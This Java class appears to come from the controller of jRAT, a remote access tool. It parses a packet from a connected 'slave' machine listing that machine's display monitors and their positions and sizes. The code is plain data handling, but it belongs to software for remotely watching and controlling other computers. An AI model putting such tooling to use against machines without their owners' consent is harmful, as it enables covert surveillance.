package io.jrat.controller.packets.incoming;

import graphslib.monitors.RemoteMonitor;
import io.jrat.controller.Slave;
import java.io.DataInputStream;


public class Packet18InitMonitors extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();

		slave.setMonitors(new RemoteMonitor[len]);

		for (int i = 0; i < len; i++) {			
			String label = slave.readLine();
			int x = dis.readInt();
			int y = dis.readInt();
			int width = dis.readInt();
			int height = dis.readInt();

			RemoteMonitor monitor = new RemoteMonitor(label, x, y, width, height);

			slave.getMonitors()[i] = monitor;
		}

	}
}
